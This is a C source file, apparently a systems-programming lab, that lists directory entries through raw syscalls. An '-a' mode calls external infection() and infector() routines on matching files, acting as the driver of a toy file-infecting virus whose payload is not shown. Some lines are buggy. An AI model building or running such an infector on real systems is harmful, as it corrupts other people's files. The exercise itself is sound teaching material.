#include "util.h"

#define SYS_READ 3
#define SYS_WRITE 4

#define STDIN 0
#define STDOUT 1
#define STDERR 2

#define SYS_OPEN 5
#define SYS_CLOSE 6

#define O_RDONLY 0
#define O_WDONLY 1
#define O_CREATE 100

#define SYS_GETDENTS 141

extern int system_call();
extern void infection();
extern void infector(char *);
extern void* code_start();
extern void* code_end();

typedef struct ent {
    int inode;
    int offset;
    short len;
    char buf[1];
} ent;

void my_printf(int print_to, int size){
    char *ch = itoa(print_to);
	system_call(SYS_WRITE,STDERR,ch,strlen(ch));
    char ch2[]={'\t',0};
    system_call(SYS_WRITE,STDERR,ch2,strlen(ch2));
	ch=itoa(size);
	system_call(SYS_WRITE,STDERR,ch,strlen(ch));
	system_call(SYS_WRITE,STDERR,"\n",1);
}
int min(int a,int b){
    if(a>b)
        return b;
    return a;
}
int main(int argc , char* argv[], char* envp[]){
    int debugMode=0,printMode=0,attachMode=0;

    int indexOfPrint=0,indexOfAttach;
		
    char bufDirectory[8192];
    int fd;
    ent *entp=(ent*)bufDirectory;
    int sizeDirectory;
    char d_type;
    int i;

    for(i=1;i<argc;i++){
		if(strcmp(argv[i],"-D")==0)
			debugMode=1;
        else if(argv[i][0]=='-' && argv[i][1]=='p'){
            indexOfPrint=i;
            printMode=1;
        }
	    else if(argv[i][0]=='-' && argv[i][1]=='a'){
            indexOfAttach=i;
            attachMode=1;
        }
	}
    if(printMode){
        fd=system_call(SYS_OPEN,".",O_RDONLY,0);
        if(debugMode) my_printf(SYS_OPEN,fd);

        sizeDirectory= system_call(SYS_GETDENTS,fd,bufDirectory,8192);
        if(debugMode)
			my_printf(SYS_GETDENTS,sizeDirectory);
        for(i=0;i<sizeDirectory;){
            entp=(ent *) (bufDirectory + i);
            int minL=min(strlen(entp->buf),strlen(argv[indexOfPrint]+2));
            if(strncmp(entp->buf,argv[indexOfPrint]+2,minL)==0){
                char * lenC=itoa(entp->len);
                d_type=*(bufDirectory + i + entp->len-1);
                system_call(SYS_WRITE,STDOUT,lenC,strlen(lenC));
                system_call(SYS_WRITE,STDOUT,"\t",1);
                system_call(SYS_WRITE,STDOUT,itoa(d_type),1);
                system_call(SYS_WRITE,STDOUT,"\t",1);
                system_call(SYS_WRITE,STDOUT,entp->buf,strlen(entp->buf));
                system_call(SYS_WRITE,STDOUT,"\n",1);
            }
            i+=entp->len;
        }
    }
    if(attachMode){
        /*print the addresses*/
		sizeDirectory=system_call(SYS_WRITE,STDOUT,itoa(code_start),strlen(itoa(code_start)));
		system_call(SYS_WRITE,STDOUT,"\n",1);
        if(debugMode) my_printf(SYS_WRITE,sizeDirectory);
		system_call(SYS_WRITE,STDOUT,"\n",1);
		sizeDirectory=system_call(SYS_WRITE,STDOUT,itoa(code_end),strlen(itoa(system_call)));
		system_call(SYS_WRITE,STDOUT,"\n",1);
        if(debugMode) my_printf(SYS_WRITE,sizeDirectory);
		system_call(SYS_WRITE,STDOUT,"\n",1);

		fd=system_call(SYS_OPEN,".",O_RDONLY,0);
        if(debugMode) my_printf(SYS_OPEN,fd);
		    sizeDirectory= system_call(SYS_GETDENTS,fd,bufDirectory,8192);
        if(debugMode)
			my_printf(SYS_GETDENTS,sizeDirectory);
        for(i=0;i<sizeDirectory;){
            entp=(ent *) (bufDirectory + i);
            int minL=min(strlen(entp->buf),strlen(argv[indexOfPrint]+2));

            if(strncmp(entp->buf,argv[indexOfAttach]+2,minL)==0){
				infection();
				infector(argv[indexOfAttach]+2);
			}
			i+=entp->len;
		}

	}
    if(printMode){
        system_call(SYS_CLOSE,fd);
		if(debugMode) my_printf(SYS_CLOSE,fd);
    }
    if(attachMode){
        system_call(SYS_CLOSE,fd);
		if(debugMode) my_printf(SYS_CLOSE,fd);
    }
    return 0;
}